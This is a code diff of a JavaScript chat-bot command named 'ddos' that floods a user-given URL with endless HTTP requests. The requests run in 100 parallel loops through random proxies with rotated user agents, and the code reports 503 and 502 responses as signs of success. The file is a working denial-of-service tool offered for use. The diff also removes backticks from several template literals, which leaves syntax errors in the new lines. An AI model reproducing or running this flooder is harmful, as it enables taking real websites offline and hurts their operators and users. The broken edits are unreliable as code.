@@ -3,6 +3,9 @@ const fs = require("fs");
 const path = require("path");
 const SocksProxyAgent = require("socks-proxy-agent");
 const HttpsProxyAgent = require("https-proxy-agent");
+const {
+    rainbow
+} = require("gradient-string");
 
 module.exports["config"] = {
     name: "ddos",
@@ -66,24 +69,24 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 10000000;
+const requestsPerSecond = 1000000;
 const numThreads = 100;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 
 const sanitizeUA = (userAgent) => {
     return userAgent.replace(/[^\x20-\x7E]/g, "");
-};
+}
 
 const userAgents = () => {
     try {
         const data = fs.readFileSync(ualist, "utf-8").replace(/\r/g, "").split("\n");
         return data.map((line) => line.trim());
     } catch (error) {
-        console.error(`Failed to read user agent list: ${error}`);
+        console.error(Failed to read user agent list: ${error});
         return [];
     }
-};
+}
 
 const loadProxies = () => {
     try {
@@ -93,7 +96,7 @@ const loadProxies = () => {
     }
 };
 
-const performAttack = (url, agent, headers, continueAttack, onComplete, chat) => {
+const performAttack = (url, agent, headers, continueAttack, onComplete) => {
     if (!continueAttack) return;
 
     const headersForRequest = {
@@ -111,25 +114,25 @@ const performAttack = (url, agent, headers, continueAttack, onComplete, chat) =>
     axios.get(url, {
         httpAgent: agent || null,
         headers: headersForRequest,
-        timeout: 0,
+        timeout: 0
     })
-    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete, chat), 0))
+    .then(() => setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0))
     .catch((err) => {
         if (err.response?.status === 503) {
-            chat.log("Target under heavy load (503).");
+            console.log(rainbow("Target under heavy load (503)."));
         } else if (err.response?.status === 502) {
-            chat.log("Bad Gateway (502).");
+            console.log(rainbow("Bad Gateway (502)."));
+        } else if (err.response?.status) {
+            console.log(rainbow(`OTHER STATUS: (${err.response?.status})`));
         }
-        setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete, chat), 0);
-        if (err.response?.status === 403) return;
-        chat.log("DDOS OTHER STATUS" + err.message);
+        setTimeout(() => performAttack(url, agent, headers, continueAttack, onComplete), 0);
     });
 };
 
 module.exports["run"] = async ({
     args,
     chat,
-    font,
+    font
 }) => {
     const targetUrl = args[0];
 
@@ -147,7 +150,7 @@ module.exports["run"] = async ({
 
     const attackTimeout = setTimeout(() => {
         continueAttack = false;
-        chat.reply(font.thin("Max flood requests Initiated. Attacking Website..."));
+        chat.reply(font.thin("Max flood requests reached. Attack stopped."));
     }, (maxRequests / requestsPerSecond) * 1000);
 
     for (let i = 0; i < numThreads && continueAttack; i++) {
@@ -155,7 +158,7 @@ module.exports["run"] = async ({
         const proxyParts = randomProxy.split(":");
 
         const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5": "http";
-        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const proxyUrl = ${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]};
 
         const agent = proxyProtocol === "socks5"
         ? new SocksProxyAgent(proxyUrl): new HttpsProxyAgent(proxyUrl);
@@ -164,6 +167,6 @@ module.exports["run"] = async ({
             if (!continueAttack) {
                 clearTimeout(attackTimeout);
             }
-        }, chat);
+        });
     }
 };
